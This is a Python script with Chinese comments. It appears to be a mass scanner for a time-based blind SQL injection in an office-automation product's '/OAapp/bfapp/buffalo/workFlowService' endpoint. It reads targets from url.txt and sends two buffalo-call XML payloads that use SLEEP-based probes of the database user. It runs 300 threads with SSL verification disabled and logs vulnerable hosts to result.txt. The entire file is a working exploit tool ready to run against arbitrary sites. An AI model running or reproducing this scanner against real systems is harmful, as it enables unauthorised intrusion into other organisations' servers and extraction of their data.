import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import urllib3
import sys

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程锁，用于安全写入文件
file_lock = threading.Lock()
results_lock = threading.Lock()

# 存储已处理的URL，避免重复
processed_urls = set()

# 定义两个POC的payload
POCS = [
    {
        'name': 'getAwokeListData',
        'data': '''<buffalo-call>
  <method>
     getAwokeListData
  </method>
  <string>
     {"k":"SELECT IF(ASCII(SUBSTRING((SELECT USER()),1,1))>97,SLEEP(3),0)"}
  </string>
</buffalo-call>''',
        'headers': {
            'Accept-Encoding': 'identity',
            'Content-Length': '168',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'Accept': '*/*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/xml'
        }
    },
    {
        'name': 'getRelationData',
        'data': '''<buffalo-call>
  <method>
     getRelationData
  </method>
  <string>
     {"ary":[{"sql":"SELECT IF(ASCII(SUBSTRING((SELECT USER()),1,1))>97,SLEEP(3),0)"}]}
  </string>
</buffalo-call>''',
        'headers': {
            'Accept-Encoding': 'identity',
            'Content-Length': '168',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'Accept': '*/*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Content-Type': 'application/xml'
        }
    }
]

def test_url(url, poc):
    """测试单个URL的漏洞"""
    try:
        # 标准化URL
        parsed_url = urlparse(url)
        if not parsed_url.scheme:
            url = 'http://' + url
        
        # 构造目标URL
        target_url = url.rstrip('/') + '/OAapp/bfapp/buffalo/workFlowService'
        
        # 记录开始时间
        start_time = time.time()
        
        # 发送POST请求
        response = requests.post(
            target_url,
            data=poc['data'],
            headers=poc['headers'],
            verify=False,
            timeout=10,
            allow_redirects=False  # 禁止重定向
        )
        
        # 计算响应时间
        elapsed_time = time.time() - start_time
        
        # 获取状态码
        status_code = response.status_code
        
        # 判断漏洞是否存在
        # 条件：状态码为200且响应时间>=3秒
        if status_code == 200 and elapsed_time >= 3:
            return {
                'url': url,
                'status_code': status_code,
                'elapsed_time': elapsed_time,
                'poc_name': poc['name'],
                'vulnerable': True
            }
        # 状态码为3xx认为不存在漏洞
        elif 300 <= status_code < 400:
            return {
                'url': url,
                'status_code': status_code,
                'poc_name': poc['name'],
                'vulnerable': False,
                'message': '3xx redirect detected'
            }
        else:
            return {
                'url': url,
                'status_code': status_code,
                'poc_name': poc['name'],
                'vulnerable': False,
                'message': f'Status code {status_code}, response time {elapsed_time:.2f}s'
            }
            
    except requests.exceptions.Timeout:
        return {
            'url': url,
            'poc_name': poc['name'],
            'vulnerable': False,
            'message': 'Request timeout'
        }
    except requests.exceptions.ConnectionError:
        return {
            'url': url,
            'poc_name': poc['name'],
            'vulnerable': False,
            'message': 'Connection error'
        }
    except Exception as e:
        return {
            'url': url,
            'poc_name': poc['name'],
            'vulnerable': False,
            'message': f'Error: {str(e)}'
        }

def write_result(result):
    """将漏洞结果写入文件"""
    with file_lock:
        with open('result.txt', 'a', encoding='utf-8') as f:
            f.write(f"[+] Vulnerable URL: {result['url']}\n")
            f.write(f"    Status Code: {result['status_code']}\n")
            f.write(f"    Response Time: {result['elapsed_time']:.2f}s\n")
            f.write(f"    POC Type: {result['poc_name']}\n")
            f.write(f"    Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("-" * 50 + "\n")

def process_url(url):
    """处理单个URL，使用两个POC进行测试"""
    with results_lock:
        if url in processed_urls:
            return []
        processed_urls.add(url)
    
    results = []
    
    # 使用两个POC测试
    for poc in POCS:
        result = test_url(url, poc)
        
        # 输出测试结果
        if result['vulnerable']:
            print(f"[+] VULNERABLE: {url}")
            print(f"    POC: {result['poc_name']}")
            print(f"    Status: {result['status_code']}")
            print(f"    Time: {result['elapsed_time']:.2f}s")
            
            # 立即写入结果文件
            write_result(result)
            results.append(result)
            
            # 如果发现漏洞，不再测试另一个POC
            break
        else:
            print(f"[-] NOT VULNERABLE: {url}")
            print(f"    POC: {result['poc_name']}")
            if 'message' in result:
                print(f"    Reason: {result['message']}")
    
    return results

def main():
    """主函数"""
    # 读取URL文件
    try:
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] Error: url.txt file not found!")
        sys.exit(1)
    
    if not urls:
        print("[-] Error: No URLs found in url.txt!")
        return
    
    print(f"[*] Loaded {len(urls)} URLs from url.txt")
    print("[*] Starting vulnerability scan...")
    print("[*] Thread count: 300")
    print("-" * 50)
    
    # 清空或创建结果文件
    with open('result.txt', 'w', encoding='utf-8') as f:
        f.write("Vulnerability Scan Results\n")
        f.write(f"Start Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("-" * 50 + "\n\n")
    
    # 使用线程池并发执行
    vulnerable_count = 0
    with ThreadPoolExecutor(max_workers=300) as executor:
        # 提交所有任务
        future_to_url = {executor.submit(process_url, url): url for url in urls}
        
        # 处理完成的任务
        for future in as_completed(future_to_url):
            try:
                results = future.result()
                vulnerable_count += len(results)
            except Exception as e:
                url = future_to_url[future]
                print(f"[-] Error processing {url}: {str(e)}")
    
    print("-" * 50)
    print(f"[*] Scan completed!")
    print(f"[*] Total URLs scanned: {len(urls)}")
    print(f"[*] Vulnerable URLs found: {vulnerable_count}")
    print(f"[*] Results saved to: result.txt")

if __name__ == "__main__":
    main()